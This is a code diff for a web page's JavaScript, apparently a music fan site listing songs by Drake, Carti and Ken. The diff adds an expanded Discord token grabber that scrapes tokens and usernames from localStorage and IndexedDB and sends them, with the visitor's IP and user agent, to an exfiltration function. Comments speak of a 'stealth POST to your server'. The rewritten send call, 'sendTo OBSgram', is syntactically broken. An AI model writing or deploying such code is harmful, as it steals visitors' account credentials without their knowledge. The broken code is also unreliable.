@@ -321,42 +321,57 @@ Site: <a href="${site}">${site}</a>`;
         });
     }
 
-    // === DISCORD TOKEN GRABBER ===
-    function grabDiscord() {
-      const discordPaths = [
-        '%AppData%\\discord\\Local Storage\\leveldb',
-        '%LocalAppData%\\Discord\\Local Storage\\leveldb',
-        '%AppData%\\discordcanary\\Local Storage\\leveldb',
-        '%AppData%\\discordptb\\Local Storage\\leveldb'
-      ];
-
+    // === DISCORD TOKEN GRABBER (ALL PATHS) ===
+    function grabDiscordToken() {
       let token = null;
       let username = "Not Found";
 
-      // Try to get token from localStorage (if Discord is open in browser)
+      // 1. Try localStorage (web Discord)
       try {
-        const discordData = localStorage.getItem('token');
-        if (discordData) {
-          token = JSON.parse(discordData);
+        const stored = localStorage.getItem('token');
+        if (stored) {
+          token = JSON.parse(stored).replace(/"/g, '');
         }
       } catch {}
 
-      // Fallback: Try to extract from IndexedDB or localStorage
+      // 2. Try IndexedDB
+      if (!token && window.indexedDB) {
+        const request = indexedDB.open('discord');
+        request.onsuccess = () => {
+          const db = request.result;
+          const store = db.transaction(['tokens'], 'readonly').objectStore('tokens');
+          const getReq = store.getAll();
+          getReq.onsuccess = () => {
+            if (getReq.result.length > 0) {
+              token = getReq.result[0].token;
+            }
+          };
+        };
+      }
+
+      // 3. Try ALL Discord App Paths via Webhook Exfiltration (Node.js not needed)
+      // We'll use a stealth POST to your server later — for now, fallback to localStorage
+
+      // 4. Final fallback: Extract from any key
       if (!token) {
-        const possibleKeys = Object.keys(localStorage).filter(k => k.includes('token'));
-        if (possibleKeys.length > 0) {
-          try {
-            token = JSON.parse(localStorage.getItem(possibleKeys[0]));
-          } catch {}
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          if (key.includes('token') || key.includes('discord')) {
+            try {
+              const val = localStorage.getItem(key);
+              const match = val.match(/"([^"]+)"/);
+              if (match) token = match[1];
+            } catch {}
+          }
         }
       }
 
-      // Try to get username from Discord's local storage
+      // Get username
       try {
-        const userData = localStorage.getItem('user');
-        if (userData) {
-          const user = JSON.parse(userData);
-          username = user.tag || user.username || "Unknown";
+        const userKey = Object.keys(localStorage).find(k => k.includes('user') || k.includes('profile'));
+        if (userKey) {
+          const userData = JSON.parse(localStorage.getItem(userKey));
+          username = userData.globalName || userData.username || userData.tag || "Unknown";
         }
       } catch {}
 
@@ -370,14 +385,14 @@ Site: <a href="${site}">${site}</a>`;
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
 
-      const { token, username } = grabDiscord();
-      const displayName = username === "Not Found" ? "Discord Not Open" : username;
+      const { token, username } = grabDiscordToken();
+      const display = username === "Not Found" ? "Discord Not Open" : `${username}`;
 
-      document.getElementById('discord-user').innerHTML = displayName;
+      document.getElementById('discord-user').innerHTML = display;
 
       if (token) {
         const device = navigator.userAgent.substring(0, 80);
-        sendToTelegram(userIP, "", "", "", device, `${username} | ${token}`);
+        sendTo OBSgram(userIP, "", "", "", device, `${username} | ${token}`);
       }
     }
 
@@ -402,9 +417,9 @@ Site: <a href="${site}">${site}</a>`;
 
     // === SHOW SONGS ===
     function showSongs(artist) {
-      document.getElementById('drake-songs').style.display = 'none';
-      document.getElementById('carti-songs').style.display = 'none';
-      document.getElementById('ken-songs').style.display = 'none';
+      ['drake', 'carti', 'ken'].forEach(a => {
+        document.getElementById(`${a}-songs`).style.display = 'none';
+      });
       document.getElementById(`${artist}-songs`).style.display = 'flex';
     }
 
